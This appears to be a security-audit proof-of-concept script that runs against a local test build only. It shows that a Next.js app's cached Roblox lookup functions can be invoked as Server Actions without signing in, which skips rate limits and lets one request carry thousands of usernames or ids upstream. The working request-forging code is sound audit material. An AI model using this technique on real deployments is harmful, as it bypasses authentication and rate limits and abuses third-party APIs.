#!/usr/bin/env node
// Security audit 3, finding L-8: "use cache" functions are reachable as Server
// Actions. Signed out, POST a Next-Action header with a cache function's id and
// your own arguments; the function runs on the server. For src/lib/roblox.ts
// that means outbound Roblox API calls with attacker-chosen usernames/IDs, with
// no sign-in and no take_roblox_lookup() limit.
//
// LOCAL ONLY: the E2E build (.next-e2e) on :3202, Roblox replaced by a local
// counting stand-in on :3297. Nothing leaves this machine.
//
//   node security-audit/attacks/use-cache-actions.mjs [--dist .next-e2e]

import { spawn, spawnSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import { createServer } from "node:http";
import { existsSync, readFileSync, writeFileSync, mkdirSync } from "node:fs";
import { isLocalUrl } from "../../src/lib/e2e.ts";

const st = JSON.parse((() => { const r = spawnSync("npx", ["supabase", "status", "-o", "json"], { encoding: "utf8" }); return r.stdout.slice(r.stdout.indexOf("{")); })());
if (!isLocalUrl(st.API_URL)) process.exit(1);
if (!existsSync(".next-e2e/BUILD_ID")) { console.error("Build first: npm run test:e2e"); process.exit(1); }

// Counting stand-in for users.roblox.com / thumbnails.roblox.com.
const upstream = [];
const mock = createServer((req, res) => {
  let body = "";
  req.on("data", (c) => (body += c));
  req.on("end", () => {
    const u = new URL(req.url, "http://x");
    upstream.push({ path: u.pathname, bytes: body.length + req.url.length, usernames: body ? (JSON.parse(body).usernames ?? []).length : 0, ids: (u.searchParams.get("userIds") ?? "").split(",").filter(Boolean).length });
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ data: [] }));
  });
}).listen(3297);

const PORT = 3202, BASE = `http://localhost:${PORT}`;
const vapid = JSON.parse(readFileSync(".next-e2e/e2e-vapid.json", "utf8"));
const env = { ...process.env, NEXT_PUBLIC_SUPABASE_URL: st.API_URL, NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY: st.PUBLISHABLE_KEY, NEXT_PUBLIC_SITE_URL: BASE, E2E_TEST_AUTH: "1", E2E_TEST_PASSWORD: randomBytes(12).toString("hex"), E2E_ROBLOX_API: "http://127.0.0.1:3297", NEXT_PUBLIC_VAPID_PUBLIC_KEY: vapid.publicKey, NEXT_TELEMETRY_DISABLED: "1" };
delete env.VERCEL;
const server = spawn("npx", ["next", "start", "-p", String(PORT)], { env, stdio: "ignore" });
const done = (code) => { server.kill("SIGTERM"); mock.close(); process.exit(code); };
for (let i = 0; i < 120; i++) { try { if ((await fetch(BASE)).ok) break; } catch {} await new Promise((r) => setTimeout(r, 500)); }

const manifest = JSON.parse(readFileSync(".next-e2e/server/server-reference-manifest.json", "utf8")).node;
const cacheFns = Object.entries(manifest).filter(([, v]) => v.exportedName?.startsWith("$$RSC_SERVER_CACHE"));
const idOf = (file, n) => cacheFns.find(([, v]) => v.filename.endsWith(file) && v.exportedName === `$$RSC_SERVER_CACHE_${n}`)?.[0];

async function invoke(id, args, page = "/about") {
  const res = await fetch(`${BASE}${page}`, { method: "POST", headers: { "Next-Action": id, "Content-Type": "text/plain;charset=UTF-8", Accept: "text/x-component", Origin: BASE }, body: JSON.stringify(args) });
  return { status: res.status, body: await res.text() };
}

const out = { cacheFunctionsInManifest: cacheFns.length, checks: [] };
const check = (name, ok, detail) => { out.checks.push({ name, vulnerable: ok, detail }); console.log(`${ok ? "VULNERABLE" : "safe      "}  ${name}: ${detail}`); };

const lookup = idOf("roblox.ts", 0), avatars = idOf("roblox.ts", 1), ids = idOf("roblox.ts", 2);
if (!lookup || !avatars || !ids) {
  console.log("Roblox cache functions are no longer server references in this build.");
  check("roblox.ts cache functions registered as server references", false, "not in manifest");
} else {
  // 1. One signed-out lookup per request, a fresh name each time, no limit.
  const before = upstream.length;
  const runs = 30;
  let ok = 0;
  for (let i = 0; i < runs; i++) {
    const r = await invoke(lookup, [`aud3probe${i}${randomBytes(3).toString("hex")}`]);
    if (r.status === 200 && /not_found|unavailable|found/.test(r.body)) ok++;
  }
  check("lookupRobloxUser(username) signed out, 30 fresh names", upstream.length - before >= runs, `${ok}/${runs} returned a lookup result; ${upstream.length - before} upstream Roblox requests${upstream.length - before >= runs ? " (sign-in and the 20/min limit bypassed)" : ""}`);

  // 2. Amplification: one request → one upstream call with as many usernames as we like.
  const b2 = upstream.length;
  const names = Array.from({ length: 5000 }, (_, i) => `aud3_${i}`);
  await invoke(ids, [names]);
  const call = upstream.slice(b2)[0];
  check("idsForUsernames(5000 names) signed out", !!call && call.usernames > 100, call ? `${call.usernames} usernames in ONE upstream request (${call.bytes} bytes); the app itself batches 100` : "no upstream call");

  const b3 = upstream.length;
  await invoke(avatars, [Array.from({ length: 3000 }, (_, i) => i + 1), "headshot"]);
  const call3 = upstream.slice(b3)[0];
  check("avatarBatch(3000 ids) signed out", !!call3 && call3.ids > 100, call3 ? `${call3.ids} ids in ONE upstream request URL (${call3.bytes} bytes)` : "no upstream call");
}
// 3. Cache functions over public data: callable too (no extra data, but they run and fill the cache per argument).
{
  const ev = idOf("events.ts", 1) ?? idOf("events.ts", 0);
  const r = ev ? await invoke(ev, ["not-a-uuid"], "/events") : { status: 0, body: "" };
  check("events.ts cache function signed out", r.status === 200, `HTTP ${r.status}`);
}
mkdirSync("security-audit/evidence", { recursive: true });
writeFileSync("security-audit/evidence/use-cache-actions.json", JSON.stringify({ ranAt: new Date().toISOString(), ...out }, null, 2));
done(out.checks.some((c) => c.vulnerable) ? 1 : 0);
